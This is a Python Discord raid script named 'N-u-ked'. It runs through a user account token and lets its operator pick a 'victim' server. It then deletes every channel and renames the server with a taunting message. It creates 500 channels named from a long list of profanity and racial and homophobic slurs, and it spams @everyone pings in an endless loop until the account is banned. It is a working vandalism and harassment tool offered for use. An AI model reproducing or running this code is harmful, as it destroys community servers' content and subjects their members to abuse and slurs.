import discord
import time
import sys
import json
import random

def banner():   
    print('************************')   
    print('        N-u-ked         ')   
    print('************************')   
    print('')

# Raid functions----------------------------------------------------------
async def channel_delete_raid():
    print('[ + ] Nuking all existent channels')
    for channel in victim.channels:
        await channel.delete()
    print('[ + ] All channels nuked')

async def channel_spam_raid():
    print('[ + ] Spamming channel create')
    for i in range(500):
        await victim.create_text_channel(random.choice(swear))
    print('[ + ] 500 channels created')

async def guild_raid():
    print('[ + ] Nuking server info')
    await victim.edit(name='NUKED', description='THIS SERVER WAS NUKED HAHA. GET REKT!!! THE MADLAD USED N-U-KED SCRIPT!!!', icon=open('N-u-ked.png', 'rb').read())
    print('[ + ] Server info updated')

async def mass_ping_raid():
    print('[ + ] Spam pinging @everyone in all channels, until ban')
    while True:
        for channel in victim.channels:
            await channel.send('@everyone ' + random.choice(swear))

async def raid():
    permissions = victim.me.guild_permissions

    print('')
    print(f'Guild Name: {victim.name}')
    print(f'Guild ID  : {victim.id}')
    print('Raid details:')
    if(permissions.administrator):
        print('  >> Nuke all channels')
        print('  >> Update server info')
        print('  >> Spam create 400 channels')
        print('  >> Mass ping @everyone')
    else:
        if(permissions.manage_channels):
            print('  >> Delete all channels')
        if(permissions.manage_guild):
            print('  >> Update server info')
        if(permissions.manage_channels):
            print('  >> Spam create 400 channels')
        if(permissions.mention_everyone):
            print('  >> Mass ping @everyone')

    choice = input('\n Confirm Raid? [y/n] ').lower()[0]
    if(choice == 'n'):
        return
    print('\n[ + ] Raid started')

    if(permissions.administrator):
        # All possible raids
        print('[ * ] Admin permission found!')
#        nick_raid(guild)
        await channel_delete_raid()
        await guild_raid()
        await channel_spam_raid()
        await mass_ping_raid()
        return

#    if(permissions.manage_nickname):
#        nick_raid(guild)
#   
  
    if(permissions.manage_channels):
        await channel_delete_raid()

    if(permissions.manage_guild):
        await guild_raid()
    
    if(permissions.manage_channels):
        await channel_spam_raid()

    if(permissions.mention_everyone):
        await mass_ping_raid()

# Vairables----------------------------------------------------------------
with open('config.json', 'r') as handle:
    global token
    config = json.load(handle)
    token = config['token']
    if not token:
        print('Token not found!')
        token = input('Enter user token: ')
        config['token'] = token
        with open('config.json', 'w') as writer:
            json.dump(config, writer)

client = discord.Client()
swear = ["4r5e", "5h1t", "5hit", "a55", "anal", "anus", "ar5e", "arrse", "arse", "ass", "ass-fucker", "asses", "assfucker", "assfukka", "asshole", "assholes", "asswhole", "a_s_s", "b!tch", "b00bs", "b17ch", "b1tch", "ballbag", "balls", "ballsack", "bastard", "beastial", "beastiality", "bellend", "bestial", "bestiality", "bi+ch", "biatch", "bitch", "bitcher", "bitchers", "bitches", "bitchin", "bitching", "bloody", "blow job", "blowjob", "blowjobs", "boiolas", "bollock", "bollok", "boner", "boob", "boobs", "booobs", "boooobs", "booooobs", "booooooobs", "breasts", "buceta", "bugger", "bum", "bunny fucker", "butt", "butthole", "buttmuch", "buttplug", "c0ck", "c0cksucker", "carpet muncher", "cawk", "chink", "cipa", "cl1t", "clit", "clitoris", "clits", "cnut", "cock", "cock-sucker", "cockface", "cockhead", "cockmunch", "cockmuncher", "cocks", "cocksuck", "cocksucked", "cocksucker", "cocksucking", "cocksucks", "cocksuka", "cocksukka", "cok", "cokmuncher", "coksucka", "coon", "cox", "crap", "cum", "cummer", "cumming", "cums", "cumshot", "cunilingus", "cunillingus", "cunnilingus", "cunt", "cuntlick", "cuntlicker", "cuntlicking", "cunts", "cyalis", "cyberfuc", "cyberfuck", "cyberfucked", "cyberfucker", "cyberfuckers", "cyberfucking", "d1ck", "damn", "dick", "dickhead", "dildo", "dildos", "dink", "dinks", "dirsa", "dlck", "dog-fucker", "doggin", "dogging", "donkeyribber", "doosh", "duche", "dyke", "ejaculate", "ejaculated", "ejaculates", "ejaculating", "ejaculatings", "ejaculation", "ejakulate", "f u c k", "f u c k e r", "f4nny", "fag", "fagging", "faggitt", "faggot", "faggs", "fagot", "fagots", "fags", "fanny", "fannyflaps", "fannyfucker", "fanyy", "fatass", "fcuk", "fcuker", "fcuking", "feck", "fecker", "felching", "fellate", "fellatio", "fingerfuck", "fingerfucked", "fingerfucker", "fingerfuckers", "fingerfucking", "fingerfucks", "fistfuck", "fistfucked", "fistfucker", "fistfuckers", "fistfucking", "fistfuckings", "fistfucks", "flange", "fook", "fooker", "fuck", "fucka", "fucked", "fucker", "fuckers", "fuckhead", "fuckheads", "fuckin", "fucking", "fuckings", "fuckingshitmotherfucker", "fuckme", "fucks", "fuckwhit", "fuckwit", "fudge packer", "fudgepacker", "fuk", "fuker", "fukker", "fukkin", "fuks", "fukwhit", "fukwit", "fux", "fux0r", "f_u_c_k", "gangbang", "gangbanged", "gangbangs", "gaylord", "gaysex", "goatse", "God", "god-dam", "god-damned", "goddamn", "goddamned", "hardcoresex", "hell", "heshe", "hoar", "hoare", "hoer", "homo", "hore", "horniest", "horny", "hotsex", "jack-off", "jackoff", "jap", "jerk-off", "jism", "jiz", "jizm", "jizz", "kawk", "knob", "knobead", "knobed", "knobend", "knobhead", "knobjocky", "knobjokey", "kock", "kondum", "kondums", "kum", "kummer", "kumming", "kums", "kunilingus", "l3i+ch", "l3itch", "labia", "lust", "lusting", "m0f0", "m0fo", "m45terbate", "ma5terb8", "ma5terbate", "masochist", "master-bate", "masterb8", "masterbat*", "masterbat3", "masterbate", "masterbation", "masterbations", "masturbate", "mo-fo", "mof0", "mofo", "mothafuck", "mothafucka", "mothafuckas", "mothafuckaz", "mothafucked", "mothafucker", "mothafuckers", "mothafuckin", "mothafucking", "mothafuckings", "mothafucks", "mother fucker", "motherfuck", "motherfucked", "motherfucker", "motherfuckers", "motherfuckin", "motherfucking", "motherfuckings", "motherfuckka", "motherfucks", "muff", "mutha", "muthafecker", "muthafuckker", "muther", "mutherfucker", "n1gga", "n1gger", "nazi", "nigg3r", "nigg4h", "nigga", "niggah", "niggas", "niggaz", "nigger", "niggers", "nob", "nob jokey", "nobhead", "nobjocky", "nobjokey", "numbnuts", "nutsack", "orgasim", "orgasims", "orgasm", "orgasms", "p0rn", "pawn", "pecker", "penis", "penisfucker", "phonesex", "phuck", "phuk", "phuked", "phuking", "phukked", "phukking", "phuks", "phuq", "pigfucker", "pimpis", "piss", "pissed", "pisser", "pissers", "pisses", "pissflaps", "pissin", "pissing", "pissoff", "poop", "porn", "porno", "pornography", "pornos", "prick", "pricks", "pron", "pube", "pusse", "pussi", "pussies", "pussy", "pussys", "rectum", "retard", "rimjaw", "rimming", "s hit", "s.o.b.", "sadist", "schlong", "screwing", "scroat", "scrote", "scrotum", "semen", "sex", "sh!+", "sh!t", "sh1t", "shag", "shagger", "shaggin", "shagging", "shemale", "shi+", "shit", "shitdick", "shite", "shited", "shitey", "shitfuck", "shitfull", "shithead", "shiting", "shitings", "shits", "shitted", "shitter", "shitters", "shitting", "shittings", "shitty", "skank", "slut", "sluts", "smegma", "smut", "snatch", "son-of-a-bitch", "spac", "spunk", "s_h_i_t", "t1tt1e5", "t1tties", "teets", "teez", "testical", "testicle", "tit", "titfuck", "tits", "titt", "tittie5", "tittiefucker", "titties", "tittyfuck", "tittywank", "titwank", "tosser", "turd", "tw4t", "twat", "twathead", "twatty", "twunt", "twunter", "v14gra", "v1gra", "vagina", "viagra", "vulva", "w00se", "wang", "wank", "wanker", "wanky", "whoar", "whore", "willies", "willy", "xrated", "xxx"]

@client.event
async def on_ready():
    print('Client connected!\n')
    time.sleep(1)

    print('Available servers:')

    for i in range(len(client.guilds)):
        print(f' >> [{i}] {client.guilds[i].name} ')
    
    global victim
    victim = client.guilds[int(input('\nEnter id of server to raid: '))]
    await raid()

@client.event
async def on_guild_remove(guild):
    if guild.id == victim.id:
        print('\n[ / ] YOU GOT BANNED, RAID OVER')
        client.close()
        sys.exit(0)

# Main--------------------------------------------------------------------
banner()
client.run(token, bot=False)